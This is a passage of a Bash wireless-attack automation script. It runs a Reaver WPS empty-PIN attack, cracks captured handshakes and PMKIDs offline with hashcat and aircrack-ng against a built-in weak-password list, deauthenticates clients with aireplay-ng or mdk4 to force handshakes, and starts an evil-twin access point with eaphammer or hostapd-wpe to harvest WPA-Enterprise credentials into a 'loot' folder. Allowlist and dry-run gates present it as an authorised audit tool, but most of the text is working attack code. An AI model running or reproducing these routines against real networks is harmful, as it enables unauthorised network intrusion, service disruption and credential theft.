	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		log_attempt "$b" "empty" "SKIP" "dry-run"
		return 1
	fi
	if ! command -v reaver &>/dev/null; then
		log_attempt "$b" "empty" "FAIL" "no reaver"
		return 1
	fi
	if ! ensure_mode "monitor"; then
		log_attempt "$b" "empty" "FAIL" "mode switch error"
		return 1
	fi

	local empty_dir
	empty_dir=$(mktemp -d "${TMP_DIR:-/tmp}/empty_XXXXXX") || {
		ensure_mode "managed" 2>/dev/null || true
		return 1
	}
	trap 'ensure_mode "managed" 2>/dev/null || true; rm -rf "$empty_dir" 2>/dev/null || true' INT TERM RETURN

	iface_set_channel "$CUR_CHANNEL" 2>/dev/null || true
	sleep 0.5
	local flog="${empty_dir}/empty_${b//:/}.log"
	: >"$flog"

	timeout -k 5 20 reaver -i "$IFACE" -b "$b" -c "$CUR_CHANNEL" -p "" -F -w -L -N -T 5 -vv >"$flog" 2>&1 || true

	if grep -qi "WPA PSK:" "$flog" 2>/dev/null; then
		local psk=""
		psk=$(grep -i "WPA PSK:" "$flog" 2>/dev/null | head -n1 | sed -E "s/.*WPA PSK:[[:space:]]*['\"]?([^'\"[:space:]]+)['\"]?.*/\1/")
		print_log VULN HACKED "Got PIN."
		save_proof "$b" "$chip" "" "${psk:-unknown}" "empty"
		HITS=$((HITS + 1))
		ok=1
	else
		if grep -qE 'WPS locked|Lock timeout|reported WPS is locked' "$flog" 2>/dev/null; then
			do_backoff "$b" "hard"
			log_attempt "$b" "empty" "FAIL" "WPS Lock"
		else
			log_attempt "$b" "empty" "FAIL" "Empty PIN rejected"
		fi
	fi

	ensure_mode "managed" 2>/dev/null || true
	trap - INT TERM RETURN
	rm -rf "$empty_dir" 2>/dev/null || true
	return $((ok ? 0 : 1))
}


function _resolve_wordlist() {
	local w="${OFFLINE_CRACK_WORDLIST:-${WPA_BRUTE_WORDLIST:-}}"
	if [[ -n "$w" && -r "$w" ]]; then
		printf '%s' "$w"
		return 0
	fi
	local f="${TMP_DIR:-/tmp}/offline_wl_$$.txt"
	if [[ ! -s "$f" ]]; then
		printf '%s\n' 12345678 123456789 1234567890 qwertyuiop 1q2w3e4r 987654321 \
			1q2w3e4r5t qazwsxedc 11111111 password 00000000 88888888 123456789a \
			password1 passw0rd admin1234 internet changeme 0123456789 >"$f" 2>/dev/null || return 1
	fi
	[[ -s "$f" ]] && printf '%s' "$f" && return 0
	return 1
}

function _hashcat_22000() {
	local b="$1" hc="$2" wl="$3"
	command -v hashcat &>/dev/null || return 1
	local sess pot out psk="" tsecs
	sess="${TMP_DIR:-/tmp}/hc_${b//:/}_$$"
	pot="${sess}.pot"
	out="${sess}.out"
	: >"$pot" 2>/dev/null || true
	rm -f "$out" 2>/dev/null || true
	local -a xopts=()
	if [[ -n "${HASHCAT_OPTS:-}" ]]; then IFS=' ' read -r -a xopts <<<"${HASHCAT_OPTS}"; fi
	local -a cmd=(hashcat -m 22000 -a 0 --quiet --potfile-path="$pot" -o "$out" --outfile-format=2 ${xopts[@]+"${xopts[@]}"} "$hc" "$wl")
	tsecs="${OFFLINE_CRACK_MAX_SECS:-30}"
	if [[ "${HASHCAT_TIMEOUT:-0}" =~ ^[0-9]+$ ]] && ((${HASHCAT_TIMEOUT:-0} > 0)); then tsecs="${HASHCAT_TIMEOUT}"; fi
	if [[ "$tsecs" =~ ^[0-9]+$ ]] && ((tsecs > 0)); then
		timeout --kill-after=5 -- "$tsecs" "${cmd[@]}" >/dev/null 2>&1 || true
	else
		"${cmd[@]}" >/dev/null 2>&1 || true
	fi
	[[ -s "$out" ]] && psk="$(head -n1 "$out" 2>/dev/null)"
	if [[ -z "$psk" && -s "$pot" ]]; then
		psk="$(head -n1 "$pot" 2>/dev/null | sed -n 's/.*://p')"
	fi
	rm -f "$pot" "$out" 2>/dev/null || true
	[[ -n "$psk" ]] || return 1
	printf '%s' "$psk"
	return 0
}

function _aircrack_cap() {
	local b="$1" cap="$2" wl="$3"
	command -v aircrack-ng &>/dev/null || return 1
	local keyf psk=""
	keyf="${TMP_DIR:-/tmp}/ac_${b//:/}_$$.key"
	rm -f "$keyf" 2>/dev/null || true
	local tsecs="${OFFLINE_CRACK_MAX_SECS:-30}"
	if [[ "$tsecs" =~ ^[0-9]+$ ]] && ((tsecs > 0)); then
		timeout --kill-after=5 -- "$tsecs" aircrack-ng -w "$wl" -b "$b" -l "$keyf" "$cap" >/dev/null 2>&1 || true
	else
		aircrack-ng -w "$wl" -b "$b" -l "$keyf" "$cap" >/dev/null 2>&1 || true
	fi
	[[ -s "$keyf" ]] && psk="$(head -n1 "$keyf" 2>/dev/null)"
	rm -f "$keyf" 2>/dev/null || true
	[[ -n "$psk" ]] || return 1
	printf '%s' "$psk"
	return 0
}

function _run_cracker() {
	local b="$1" cap="$2" wl="$3" hc="" psk=""
	[[ -n "$wl" && -s "$wl" ]] || return 1
	case "$cap" in
	*.22000) hc="$cap" ;;
	*)
		if command -v hashcat &>/dev/null && command -v hcxpcapngtool &>/dev/null; then
			hc="${TMP_DIR:-/tmp}/crack_${b//:/}_$(date +%s%N).22000"
			hcxpcapngtool -o "$hc" "$cap" >/dev/null 2>&1 || true
			[[ -s "$hc" ]] || hc=""
		fi
		;;
	esac
	if [[ -n "$hc" ]] && command -v hashcat &>/dev/null; then
		psk="$(_hashcat_22000 "$b" "$hc" "$wl")" || psk=""
	else
		case "$cap" in
		*.cap | *.pcap | *.pcapng) psk="$(_aircrack_cap "$b" "$cap" "$wl")" || psk="" ;;
		esac
	fi
	if [[ -n "$hc" && "$hc" != "$cap" ]]; then rm -f "$hc" 2>/dev/null || true; fi
	[[ -n "$psk" ]] || return 1
	printf '%s' "$psk"
	return 0
}

function _defaultkey_list() {
	local b="$1" essid="$2" out filtered
	if [[ -n "${DEFAULTKEY_WORDLIST:-}" && -r "${DEFAULTKEY_WORDLIST}" ]]; then
		printf '%s' "${DEFAULTKEY_WORDLIST}"
		return 0
	fi
	[[ -n "${DEFAULTKEY_GEN_CMD:-}" ]] || return 1
	local -a gen=()
	IFS=' ' read -r -a gen <<<"${DEFAULTKEY_GEN_CMD}"
	[[ ${#gen[@]} -ge 1 ]] && command -v "${gen[0]}" &>/dev/null || return 1
	out="${TMP_DIR:-/tmp}/defkey_${b//:/}_$(date +%s%N).txt"
	local tsecs="${DEFAULTKEY_MAX_SECS:-15}"
	if [[ "$tsecs" =~ ^[0-9]+$ ]] && ((tsecs > 0)); then
		timeout --kill-after=5 -- "$tsecs" "${gen[@]}" "$b" "$essid" >"$out" 2>/dev/null || true
	else
		"${gen[@]}" "$b" "$essid" >"$out" 2>/dev/null || true
	fi
	if [[ -s "$out" ]]; then
		filtered="${out}.f"
		awk 'length($0)>=8 && length($0)<=63' "$out" >"$filtered" 2>/dev/null || true
		rm -f "$out" 2>/dev/null || true
		if [[ -s "$filtered" ]]; then printf '%s' "$filtered"; return 0; fi
	fi
	rm -f "$out" 2>/dev/null || true
	return 1
}

function offline_crack() {
	local b="$1" essid="$2" chip="$3" meth="$4" cap="$5"
	[[ "${ENABLE_OFFLINE_CRACK:-1}" == "1" ]] || { log_attempt "$b" "$meth" "SKIP" "offline crack disabled"; return 1; }
	[[ "${ENABLE_DRY_RUN:-0}" == "1" ]] && { log_attempt "$b" "$meth" "SKIP" "dry-run"; return 1; }
	[[ -s "$cap" ]] || { log_attempt "$b" "$meth" "FAIL" "empty capture"; return 1; }

	local psk=""

	if [[ "${ENABLE_DEFAULTKEY_GEN:-1}" == "1" ]]; then
		local dkl dk_meth="defaultkey"
		[[ "$meth" == *-tm ]] && dk_meth="defaultkey-tm"
		dkl="$(_defaultkey_list "$b" "$essid")" || dkl=""
		if [[ -n "$dkl" && -s "$dkl" ]]; then
			print_log INFO DEFKEY "Defkey try $b"
			log_attempt "$b" "$dk_meth" "START" "default-key candidates=$(wc -l <"$dkl" 2>/dev/null | tr -d ' ') essid=${essid:-}"
			psk="$(_run_cracker "$b" "$cap" "$dkl")" || psk=""
			if [[ "$dkl" == *.f ]]; then rm -f "$dkl" 2>/dev/null || true; fi
			if [[ -n "$psk" ]]; then
				print_log VULN HACKED "$b key found"
				save_proof "$b" "$chip" "" "$psk" "$dk_meth"
				return 0
			fi
			log_attempt "$b" "$dk_meth" "FAIL" "no default-key candidate matched"
		fi
	fi

	local wl
	wl="$(_resolve_wordlist)" || wl=""
	[[ -n "$wl" ]] || { log_attempt "$b" "$meth" "SKIP" "no wordlist (set OFFLINE_CRACK_WORDLIST)"; return 1; }
	log_attempt "$b" "$meth" "START" "offline crack budget=${OFFLINE_CRACK_MAX_SECS:-30}s wl=${wl##*/}"
	psk="$(_run_cracker "$b" "$cap" "$wl")" || psk=""
	if [[ -n "$psk" ]]; then
		print_log VULN HACKED "$b key found"
		save_proof "$b" "$chip" "" "$psk" "$meth"
		return 0
	fi
	log_attempt "$b" "$meth" "FAIL" "offline crack: no key within ${OFFLINE_CRACK_MAX_SECS:-30}s / wordlist"
	return 1
}

function attack_pmkid() {
	local b="$1"
	local chip="${2:-}"
	local ver="${3:-}"
	local pin="${4:-}"
	local chip_family="${5:-}"
	local channel="${CUR_CHANNEL:-1}"
	local pcapng hashcat_file filter_file proof_name proof_path timeout_secs pmkid_count
	local hcx_out_opt="-o"

	print_log INFO PMKID-LISTEN "PMKID try $b"
	log_attempt "$b" "pmkid" "START" "channel=$channel chip=${chip:-n/a}"

	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		log_attempt "$b" "pmkid" "SKIP" "dry-run"
		return 1
	fi

	if ! command -v hcxdumptool &>/dev/null || ! command -v hcxpcapngtool &>/dev/null; then
		log_attempt "$b" "pmkid" "FAIL" "hcxdumptool/hcxpcapngtool missing"
		return 1
	fi

	if ! ensure_mode "monitor"; then
		log_attempt "$b" "pmkid" "FAIL" "monitor mode failed"
		return 1
	fi

	iface_set_channel "$channel" 2>/dev/null || true
	pcapng="${TMP_DIR}/pmkid_${b//:/}_$(date +%s).pcapng"
	hashcat_file="${TMP_DIR}/pmkid_${b//:/}.22000"
	filter_file="${TMP_DIR}/pmkid_filter_${b//:/}.txt"
	timeout_secs="${PMKID_TIMEOUT:-10}"

	printf '%s\n' "$b" >"$filter_file" 2>/dev/null || true

	if hcxdumptool -h 2>&1 | grep -qE -- '-w[[:space:],]|--write'; then
		hcx_out_opt="-w"
	fi

	timeout "$timeout_secs" hcxdumptool -i "$IFACE" "$hcx_out_opt" "$pcapng" \
		--filtermode=2 --filterlist_ap="$filter_file" \
		--enable_status=1 >/dev/null 2>&1 || true

	if [[ -s "$pcapng" ]]; then
		hcxpcapngtool -o "$hashcat_file" "$pcapng" >/dev/null 2>&1 || true
	fi

	ensure_mode "managed" 2>/dev/null || true
	rm -f "$filter_file" 2>/dev/null || true

	if [[ -s "$hashcat_file" ]]; then
		pmkid_count=$(wc -l <"$hashcat_file" 2>/dev/null) || pmkid_count=0
		pmkid_count=${pmkid_count//[!0-9]/}
		[[ -n "$pmkid_count" ]] || pmkid_count=0

		if ((pmkid_count > 0)); then
			print_log VULN PMKID "$b PMKID got"
			proof_name="pmkid_${b//:/}_$(date +%s).22000"
			proof_path="${HASH_DIR:-$LOG_DIR}/${proof_name}"
			mv -f "$hashcat_file" "$proof_path" 2>/dev/null || true
			chmod 600 "$proof_path" 2>/dev/null || true
			log_attempt "$b" "pmkid" "SUCCESS" "pmkid_count=$pmkid_count proof=$proof_name"
			HITS=$((${HITS:-0} + 1))
			mark_known "$b" "PMKID_SUCCESS"
			if [[ "${ENABLE_OFFLINE_CRACK:-1}" == "1" ]]; then
				local _cm="pmkid"
				[[ "${CUR_WPA3_TM:-0}" == "1" ]] && _cm="pmkid-tm"
				offline_crack "$b" "${CUR_ESSID:-}" "${chip:-}" "$_cm" "$proof_path" || true
			fi
			return 0
		fi
	fi

	log_attempt "$b" "pmkid" "FAIL" "no PMKID captured"
	return 1
}

function eapol_passive_capture() {
	local b="$1"
	local chip="${2:-}"
	local ver="${3:-}"
	local pin="${4:-}"
	local chip_family="${5:-}"
	local channel="${CUR_CHANNEL:-1}"
	local essid="${CUR_ESSID:-}"
	local pcap proof_name proof_path timeout_secs eapol_count

	print_log INFO HANDSHAKE-WAIT "Waiting for handshake $b"
	log_attempt "$b" "eapol_passive" "START" "channel=$channel essid=${essid:-}"

	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		log_attempt "$b" "eapol_passive" "SKIP" "dry-run"
		return 1
	fi

	if ! command -v tcpdump &>/dev/null; then
		log_attempt "$b" "eapol_passive" "FAIL" "tcpdump missing"
		return 1
	fi

	if ! ensure_mode "monitor"; then
		log_attempt "$b" "eapol_passive" "FAIL" "monitor mode failed"
		return 1
	fi

	iface_set_channel "$channel" 2>/dev/null || true
	pcap="${TMP_DIR}/eapol_${b//:/}_$(date +%s).pcap"
	timeout_secs="${EAPOL_PASSIVE_TIMEOUT:-30}"

	timeout "$timeout_secs" tcpdump -i "$IFACE" -w "$pcap" \
		"ether host $b and ether proto 0x888e" 2>/dev/null || true

	ensure_mode "managed" 2>/dev/null || true

	if [[ -s "$pcap" ]]; then
		eapol_count=$(tcpdump -r "$pcap" -nn 'ether proto 0x888e' 2>/dev/null | wc -l) || eapol_count=0
		eapol_count=${eapol_count//[!0-9]/}
		[[ -n "$eapol_count" ]] || eapol_count=0

		if ((eapol_count >= 4)); then
			print_log VULN EAPOL "$b EAPOL seen"
			proof_name="eapol_${b//:/}_$(date +%s).pcap"
			proof_path="${HASH_DIR:-$LOG_DIR}/${proof_name}"
			mv -f "$pcap" "$proof_path" 2>/dev/null || true
			chmod 600 "$proof_path" 2>/dev/null || true
			log_attempt "$b" "eapol_passive" "SUCCESS" "eapol_count=$eapol_count proof=$proof_name"
			HITS=$((${HITS:-0} + 1))
			mark_known "$b" "EAPOL_PASSIVE_SUCCESS"
			return 0
		fi
	fi

	log_attempt "$b" "eapol_passive" "FAIL" "insufficient EAPOL frames"
	return 1
}

function attack_pmkid_active() {
	local b="$1"
	local chip="${2:-}"
	local ver="${3:-}"
	local pin="${4:-}"
	local chip_family="${5:-}"
	local channel="${CUR_CHANNEL:-1}"
	local pcapng hashcat_file filter_file proof_name proof_path timeout_secs pmkid_count
	local hcx_out_opt="-o" active_opt="" hlp=""

	print_log INFO PMKID-ASK "PMKID try $b"
	log_attempt "$b" "pmkid_active" "START" "channel=$channel chip=${chip:-n/a}"

	if [[ "${ENABLE_DEAUTH:-1}" == "1" ]]; then
		log_attempt "$b" "pmkid_active" "SKIP" "disabled"
		return 1
	fi
	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		log_attempt "$b" "pmkid_active" "SKIP" "dry-run"
		return 1
	fi
	if ! active_attack_permitted "$b"; then
		log_attempt "$b" "pmkid_active" "SKIP" "not allowlisted (state=${ACTIVE_ALLOWLIST_STATE:-absent})"
		return 1
	fi
	if ! command -v hcxdumptool &>/dev/null || ! command -v hcxpcapngtool &>/dev/null; then
		log_attempt "$b" "pmkid_active" "FAIL" "hcxdumptool/hcxpcapngtool missing"
		return 1
	fi
	if ! ensure_mode "monitor"; then
		log_attempt "$b" "pmkid_active" "FAIL" "monitor mode failed"
		return 1
	fi

	iface_set_channel "$channel" 2>/dev/null || true
	pcapng="${TMP_DIR}/pmkidx_${b//:/}_$(date +%s).pcapng"
	hashcat_file="${TMP_DIR}/pmkidx_${b//:/}.22000"
	filter_file="${TMP_DIR}/pmkidx_filter_${b//:/}.txt"
	timeout_secs="${PMKID_ACTIVE_TIMEOUT:-15}"
	printf '%s\n' "$b" >"$filter_file" 2>/dev/null || true

	hlp="$(hcxdumptool -h 2>&1 || true)"
	if grep -qE -- '-w[[:space:],]|--write' <<<"$hlp"; then
		hcx_out_opt="-w"
	fi
	if grep -qE -- '--active_beacon' <<<"$hlp"; then
		active_opt="--active_beacon"
	elif grep -qE -- '--attemptapmax' <<<"$hlp"; then
		active_opt="--attemptapmax=8"
	fi

	timeout "$timeout_secs" hcxdumptool -i "$IFACE" "$hcx_out_opt" "$pcapng" \
		--filtermode=2 --filterlist_ap="$filter_file" $active_opt \
		--enable_status=1 >/dev/null 2>&1 || true

	if [[ -s "$pcapng" ]]; then
		hcxpcapngtool -o "$hashcat_file" "$pcapng" >/dev/null 2>&1 || true
	fi

	ensure_mode "managed" 2>/dev/null || true
	rm -f "$filter_file" 2>/dev/null || true

	if [[ -s "$hashcat_file" ]]; then
		pmkid_count=$(wc -l <"$hashcat_file" 2>/dev/null) || pmkid_count=0
		pmkid_count=${pmkid_count//[!0-9]/}
		[[ -n "$pmkid_count" ]] || pmkid_count=0
		if ((pmkid_count > 0)); then
			print_log VULN PMKIDX "$b PMKID got"
			proof_name="pmkid_active_${b//:/}_$(date +%s).22000"
			proof_path="${HASH_DIR:-$LOG_DIR}/${proof_name}"
			mkdir -p "$LOG_DIR" 2>/dev/null || true
			mv -f "$hashcat_file" "$proof_path" 2>/dev/null || true
			chmod 600 "$proof_path" 2>/dev/null || true
			log_attempt "$b" "pmkid_active" "SUCCESS" "pmkid_count=$pmkid_count proof=$proof_name"
			HITS=$((${HITS:-0} + 1))
			mark_known "$b" "PMKID_ACTIVE_SUCCESS"
			rm -f "$pcapng" 2>/dev/null || true
			if [[ "${ENABLE_OFFLINE_CRACK:-1}" == "1" ]]; then
				local _cm="pmkid"
				[[ "${CUR_WPA3_TM:-0}" == "1" ]] && _cm="pmkid-tm"
				offline_crack "$b" "${CUR_ESSID:-}" "${chip:-}" "$_cm" "$proof_path" || true
			fi
			return 0
		fi
	fi

	rm -f "$pcapng" 2>/dev/null || true
	log_attempt "$b" "pmkid_active" "FAIL" "no PMKID captured"
	return 1
}


function attack_deauth_handshake() {
	local b="$1"
	local chip="${2:-}"
	local ver="${3:-}"
	local pin="${4:-}"
	local chip_family="${5:-}"
	local channel="${CUR_CHANNEL:-1}"
	local essid="${CUR_ESSID:-}"
	local burst max_clients cap_secs scan_secs
	local work prefix csv capf eapol_count proof_name proof_path
	local -a clients=()
	local ok=0 dump_pid="" c

	print_log INFO HANDSHAKE-GRAB "Forcing capture $b"
	log_attempt "$b" "deauth_handshake" "START" "channel=$channel essid=${essid:-}"

	if [[ "${ENABLE_DEAUTH:-0}" != "1" ]]; then
		log_attempt "$b" "deauth_handshake" "SKIP" "disabled (fail-closed)"
		return 1
	fi
	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		log_attempt "$b" "deauth_handshake" "SKIP" "dry-run"
		return 1
	fi
	if ! active_attack_permitted "$b"; then
		log_attempt "$b" "deauth_handshake" "SKIP" "not allowlisted (state=${ACTIVE_ALLOWLIST_STATE:-absent})"
		return 1
	fi
	if ! command -v airodump-ng &>/dev/null; then
		log_attempt "$b" "deauth_handshake" "FAIL" "airodump-ng missing"
		return 1
	fi
	if ! command -v aireplay-ng &>/dev/null && ! command -v mdk4 &>/dev/null; then
		log_attempt "$b" "deauth_handshake" "FAIL" "aireplay-ng/mdk4 missing"
		return 1
	fi
	if ! command -v tcpdump &>/dev/null; then
		log_attempt "$b" "deauth_handshake" "FAIL" "tcpdump missing (handshake verify)"
		return 1
	fi

	burst="${DEAUTH_BURST:-5}"
	max_clients="${DEAUTH_MAX_CLIENTS:-3}"
	cap_secs="${DEAUTH_CAPTURE_SECS:-20}"
	scan_secs="${DEAUTH_CLIENT_SCAN_SECS:-6}"

	if ! ensure_mode "monitor"; then
		log_attempt "$b" "deauth_handshake" "FAIL" "monitor mode failed"
		return 1
	fi

	work=$(mktemp -d "${TMP_DIR:-/tmp}/deauth_XXXXXX") || {
		ensure_mode "managed" 2>/dev/null || true
		return 1
	}
	trap 'kill "$dump_pid" 2>/dev/null || true; ensure_mode "managed" 2>/dev/null || true; rm -rf "$work" 2>/dev/null || true' INT TERM RETURN

	iface_set_channel "$channel" 2>/dev/null || true
	prefix="${work}/hs_${b//:/}"

	timeout --kill-after=3 -- "$((cap_secs + scan_secs))" \
		airodump-ng -c "$channel" --bssid "$b" -w "$prefix" --output-format pcap,csv "$IFACE" \
		>/dev/null 2>&1 &
	dump_pid=$!
	BG_PIDS+=("$dump_pid")

	sleep "$scan_secs"

	csv=$(find "$work" -maxdepth 1 -type f -name "$(basename "$prefix")-*.csv" 2>/dev/null | head -n1 || true)
	if [[ -n "$csv" && -f "$csv" ]]; then
		while IFS= read -r c; do
			[[ -n "$c" ]] || continue
			clients+=("$c")
			((${#clients[@]} >= max_clients)) && break
		done < <(awk -F', *' -v ap="${b^^}" '
			/Station MAC/{st=1; next}
			st==1 && NF>=6 {
				mac=toupper($1); bss=toupper($6)
				if (mac ~ /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/ && bss==ap) print mac
			}' "$csv" 2>/dev/null | sort -u)
	fi

	if ((${#clients[@]} == 0)); then
		if [[ "${ENABLE_DEAUTH_BROADCAST:-0}" == "1" ]]; then
			print_log WARN DEAUTH "Force disconnect all clients"
			log_attempt "$b" "deauth_handshake" "TX" "no_client broadcast_burst=$burst"
			if command -v aireplay-ng &>/dev/null; then
				timeout --kill-after=2 -- 10 aireplay-ng -0 "$burst" -a "$b" "$IFACE" >/dev/null 2>&1 || true
			else
				timeout --kill-after=2 -- 10 mdk4 "$IFACE" d -B "$b" -c "$channel" >/dev/null 2>&1 || true
			fi
		else
			print_log INFO HANDSHAKE-GRAB "$b Passive only"
			log_attempt "$b" "deauth_handshake" "INFO" "no_client (ENABLE_DEAUTH_BROADCAST=0)"
		fi
	else
		print_log HANDSHAKE-GRAB "Deauth $b"
		for c in "${clients[@]}"; do
			log_attempt "$b" "deauth_handshake" "TX" "client=$c burst=$burst"
			if command -v aireplay-ng &>/dev/null; then
				timeout --kill-after=2 -- 10 aireplay-ng -0 "$burst" -a "$b" -c "$c" "$IFACE" >/dev/null 2>&1 || true
			else
				timeout --kill-after=2 -- 10 mdk4 "$IFACE" d -c "$channel" -B "$b" -S "$c" >/dev/null 2>&1 || true
			fi
			sleep "$(((RANDOM % 2) + 1))"
		done
	fi

	wait "$dump_pid" 2>/dev/null || true

	capf=$(find "$work" -maxdepth 1 -type f -name "$(basename "$prefix")-*.cap" 2>/dev/null | head -n1 || true)
	eapol_count=0
	if [[ -n "$capf" && -f "$capf" ]]; then
		eapol_count=$(tcpdump -r "$capf" -nn 'ether proto 0x888e' 2>/dev/null | wc -l) || eapol_count=0
		eapol_count=${eapol_count//[!0-9]/}
		[[ -n "$eapol_count" ]] || eapol_count=0
		if ((eapol_count >= 4)); then
			print_log VULN HANDSHAKE "$b handshake got"
			proof_name="handshake_${b//:/}_$(date +%s).cap"
			proof_path="${HASH_DIR:-$LOG_DIR}/${proof_name}"
			mkdir -p "$LOG_DIR" 2>/dev/null || true
			mv -f "$capf" "$proof_path" 2>/dev/null || true
			chmod 600 "$proof_path" 2>/dev/null || true
			log_attempt "$b" "deauth_handshake" "SUCCESS" "eapol_count=$eapol_count clients=${#clients[@]} proof=$proof_name"
			HITS=$((${HITS:-0} + 1))
			mark_known "$b" "HANDSHAKE_CAPTURE"
			ok=1
			if [[ "${ENABLE_OFFLINE_CRACK:-1}" == "1" ]]; then
				local _cm="handshake"
				[[ "${CUR_WPA3_TM:-0}" == "1" ]] && _cm="handshake-tm"
				offline_crack "$b" "${CUR_ESSID:-}" "${chip:-}" "$_cm" "$proof_path" || true
			fi
		fi
	fi

	if ((ok == 0)); then
		log_attempt "$b" "deauth_handshake" "FAIL" "no handshake (clients=${#clients[@]} eapol=${eapol_count})"
	fi

	return $((ok ? 0 : 1))
}


function wpa_audit_allowed() {
	local b="$1"

	if [[ "${ENABLE_WPA_AUDIT:-0}" != "1" ]]; then
		return 1
	fi

	if [[ "${WPA_AUDIT_REQUIRE_ALLOWLIST:-1}" == "1" ]]; then
		if [[ "${ACTIVE_ALLOWLIST_STATE:-absent}" != "present" ]]; then
			print_log WARN WPAAUDIT "Need allowlist"
			return 1
		fi
	fi

	if ! active_attack_permitted "$b"; then
		return 1
	fi

	return 0
}

function wpa_audit_posture() {
	local b="$1"
	local psk="${2:-NO}"
	local wpa3="${3:-NO}"
	local akm="${4:-}"
	local pmf_mode="${5:-?}"

	if [[ "${ENABLE_WPA_AUDIT:-0}" != "1" ]]; then
		return 0
	fi

	log_attempt "$b" "wpa_audit_posture" "INFO" \
		"psk=${psk} wpa3=${wpa3} pmf_mode=${pmf_mode} akm=${akm:-}"

	if [[ "$psk" == "YES" && "$wpa3" != "YES" ]]; then
		print_log WARN WPAAUDIT \
			"$b: PSK network without WPA3-SAE. Consider WPA3 transition or SAE-only where clients allow."
	fi

	if [[ "$psk" == "YES" && "$pmf_mode" != "req" && "$pmf_mode" != "REQUIRED" ]]; then
		print_log WARN WPAAUDIT \
			"$b: PSK network does not advertise PMF required. Prefer PMF required on WPA3/modern deployments."
	fi

	case ",${akm}," in
	*,PSK,* | *,SAE,* | *,FT-PSK,* | *,FT-SAE,* | *,PSK-SHA256,* | *,SAE-EXT-KEY,*)
		:
		;;
	*)
		if [[ "$psk" == "YES" ]]; then
			print_log WARN WPAAUDIT \
				"$b: PSK flag present but no explicit PSK/SAE AKM token was observed."
		fi
		;;
	esac

	return 0
}

function wpa_audit_external_dispatch() {
	local b="$1"
	local essid="${2:-}"
	local channel="${3:-1}"

	if [[ "${ENABLE_WPA_AUDIT:-0}" != "1" ]]; then
		return 1
	fi

	if [[ "${WPA_AUDIT_MODE,,}" != "external" ]]; then
		return 1
	fi

	print_log INFO WPAAUDIT "Audit $b"
	log_attempt "$b" "wpa_audit_external" "START" \
		"essid=${essid:-<hidden>} channel=${channel} mode=${WPA_AUDIT_MODE}"

	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		print_log WARN WPAAUDIT "Dry run"
		log_attempt "$b" "wpa_audit_external" "SKIP" "dry-run"
		return 1
	fi

	if ! wpa_audit_allowed "$b"; then
		log_attempt "$b" "wpa_audit_external" "SKIP" "not allowed by allowlist/policy"
		return 1
	fi

	if [[ -z "${WPA_AUDIT_EXTERNAL_TOOL:-}" || ! -x "${WPA_AUDIT_EXTERNAL_TOOL}" ]]; then
		print_log ERROR WPAAUDIT "No tool"
		log_attempt "$b" "wpa_audit_external" "FAIL" "missing external tool"
		return 1
	fi

	if [[ -z "${WPA_AUDIT_WORDLIST:-}" || ! -r "${WPA_AUDIT_WORDLIST}" ]]; then
		print_log ERROR WPAAUDIT "No wordlist"
		log_attempt "$b" "wpa_audit_external" "FAIL" "missing wordlist"
		return 1
	fi

	print_log WARN WPAAUDIT \
		"External active WPA audit executor is disabled in this safe build."

	log_attempt "$b" "wpa_audit_external" "SKIP" \
		"safe build: active executor disabled"

	return 1
}


function attack_wpa_enterprise_eviltwin() {
	local b="$1" essid="${2:-}" channel="${3:-1}" akm="${4:-}"
	local tool="" loot_dir logf proof cred_count=0 t f
	local -a et_args=()

	print_log INFO EVILTWIN "Eviltwin $b"
	log_attempt "$b" "eviltwin_eap" "START" "essid=${essid:-<hidden>} channel=$channel akm=${akm:-}"

	if [[ "${ENABLE_EVILTWIN:-0}" != "1" ]]; then
		log_attempt "$b" "eviltwin_eap" "SKIP" "disabled (fail-closed)"
		return 1
	fi
	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		log_attempt "$b" "eviltwin_eap" "SKIP" "dry-run"
		return 1
	fi
	if ! is_wpa_enterprise "$akm"; then
		log_attempt "$b" "eviltwin_eap" "SKIP" "not 802.1X/EAP (akm=${akm:-})"
		return 1
	fi
	if ! active_attack_permitted "$b"; then
		print_log WARN EVILTWIN "Out scope"
		log_attempt "$b" "eviltwin_eap" "SKIP" "bssid not in scope (state=${ACTIVE_ALLOWLIST_STATE:-absent})"
		return 1
	fi
	if ! eviltwin_essid_allowlisted "$essid"; then
		print_log WARN EVILTWIN "Out scope"
		log_attempt "$b" "eviltwin_eap" "SKIP" "essid not in scope"
		return 1
	fi

	tool="${EVILTWIN_TOOL:-}"
	if [[ -z "$tool" ]]; then
		if command -v eaphammer &>/dev/null; then
			tool="eaphammer"
		elif command -v hostapd-wpe &>/dev/null; then
			tool="hostapd-wpe"
		fi
	fi
	[[ "$tool" == "hostapd_wpe" ]] && tool="hostapd-wpe"
	if [[ -z "$tool" ]] || ! command -v "$tool" &>/dev/null; then
		log_attempt "$b" "eviltwin_eap" "FAIL" "no eaphammer/hostapd-wpe available"
		return 1
	fi

	loot_dir="${HASH_DIR:-$LOG_DIR}/eviltwin"
	mkdir -p "$loot_dir" 2>/dev/null || {
		log_attempt "$b" "eviltwin_eap" "FAIL" "cannot create loot dir"
		return 1
	}
	chmod 700 "$loot_dir" 2>/dev/null || true
	logf="${loot_dir}/eviltwin_${b//:/}_$(date +%s).log"
	: >"$logf"
	chmod 600 "$logf" 2>/dev/null || true
	t="${EVILTWIN_TIMEOUT:-120}"

	trap 'ensure_mode "managed" 2>/dev/null || true; if command -v nmcli >/dev/null 2>&1; then nmcli dev set "$IFACE" managed yes 2>/dev/null || true; fi' RETURN

	print_log WARN EVILTWIN "Eviltwin up"

	if [[ "$tool" == "eaphammer" ]]; then
		et_args=(-i "$IFACE" --essid "$essid" --bssid "$b" --channel "$channel" --auth wpa-eap --creds)
		timeout --kill-after=10 -- "$t" eaphammer "${et_args[@]}" >"$logf" 2>&1 || true
	else
		local conf="${loot_dir}/hostapd_wpe_${b//:/}.conf"
		{
			printf 'interface=%s\n' "$IFACE"
			printf 'ssid=%s\n' "$essid"
			printf 'channel=%s\n' "$channel"
			printf 'hw_mode=g\n'
			printf 'ieee8021x=1\n'
			printf 'eap_server=1\n'
			printf 'eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user\n'
			printf 'ca_cert=/etc/hostapd-wpe/certs/ca.pem\n'
